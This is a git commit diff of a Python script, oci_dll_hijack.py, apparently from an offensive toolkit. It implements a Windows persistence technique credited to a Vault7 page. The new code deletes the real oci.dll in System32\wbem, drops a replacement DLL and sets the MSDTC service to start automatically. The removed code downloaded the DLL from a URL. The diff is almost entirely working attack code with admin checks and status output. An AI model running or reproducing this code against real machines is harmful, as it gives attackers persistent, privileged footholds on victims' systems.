1ba964b4efa47e86cb0bbb2012ad55a499d6a106
rootm0s <rickardmalmkvist@hotmail.com>
2018-05-03 21:13:00 +0200

    Update oci_dll_hijack.py

--- oci_dll_hijack.py
+++ oci_dll_hijack.py
@@ -1,41 +1,64 @@
 """
 https://wikileaks.org/ciav7p1/cms/page_2621767.html
-	
-Windows contains a service called "Distributed Transaction Coordinator" that is
-configured to "Manual" start by default. This service causes a DLL called
-"C:\Windows\System32\wbem\oci.dll" to load into the "Network Services" group.
-By placing our own DLL in this location and configuring the service to start
-automatially, we have a persistence mechanism with system privileges. The service
-runs under the "Network Service" account, which is a restricted account that has
-privileges to access the network.
+Works from: Unknown
+Fixed in: Unknown
 """
 import os
-import requests
+import shutil
+import ctypes
+from colorama import init, Fore
+init(convert=True)
 
-def oci_dll_hijack(url,rename_dll):
-	dll = "oci.dll"
-	dll_path = "C:\Windows\System32\wbem"
-	
-	if (rename_dll == 1):
-		if (os.path.isfile(os.path.join(dll_path,dll)) == True):
+dll_name = "oci.dll"
+dll_drop = "C:\Windows\System32\wbem"
+
+def successBox():
+	return (Fore.GREEN + '[+]' + Fore.RESET)
+
+def errorBox():
+	return (Fore.RED + '[-]' + Fore.RESET)
+
+def infoBox():
+	return (Fore.CYAN + '[!]' + Fore.RESET)	
+
+def warningBox():
+	return (Fore.YELLOW + '[!]' + Fore.RESET)
+
+def oci_dll_hijack():
+	print " {} oci_dll_hijack: Attempting to dll hijack msdtc service".format(infoBox())
+	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
+		print " {} oci_dll_hijack: We are running as admin, we can proceed".format(infoBox())
+
+		if (os.path.isfile(os.path.join(dll_drop,dll_name)) == True):
 			try:
-				os.rename(os.path.join(dll_path,dll),os.path.join(dll_path,"oci.dll.old"))
-			except Exception as e:
+				os.remove(os.path.join(dll_drop,dll_name))
+				print " {} oci_dll_hijack: Successfully removed: {} from: {}".format(successBox(),dll_name,dll_drop)
+			except Exception as error:
+				print " {} oci_dll_hijack: Unable to remove: {} from: {}".format(errorBox(),dll_name,dll_drop)
 				return False
 
-	try:
-		download = requests.get(url)
-		if (len(download.content) > 1):
-			with open(os.path.join(dll_path,dll),"wb") as dll_file:
-				dll_file.write(download.content)
-				dll_file.close()
-			if (os.path.isfile(os.path.join(dll_path,dll)) == True):
-				try:
-					popen = os.popen("sc qc msdtc & sc config msdtc start=auto & sc qc msdtc")
-					return True
-				except Exception as e:
-					return False
-		else:
+		try:
+			shutil.copy(dll_name,dll_drop)
+			print " {} oci_dll_hijack: Successfully copied: {} to: {}".format(successBox(),dll_name,dll_drop)
+		except shutil.Error as error:
+			print " {} oci_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
 			return False
-	except Exception as e:
+		except IOError as error:
+			print " {} oci_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
+			return False
+
+		if (os.path.isfile(os.path.join(dll_drop,dll_name)) == True):
+			commands = ["sc qc msdtc",
+					"sc config msdtc start=auto",
+					"sc qc msdtc"]
+
+			for command in commands:
+				x = os.popen(command)
+				if ("SUCCESS" in x.read()):
+					print " {} oci_dll_hijack: Successfully ran SC command: {}".format(successBox(),command)
+				else:
+					print " {} oci_dll_hijack: Unable run SC command: {}".format(errorBox(),command)
+					return False
+	else:
+		print " {} oci_dll_hijack: We are not admin, cannot proceed".format(errorBox())
 		return False
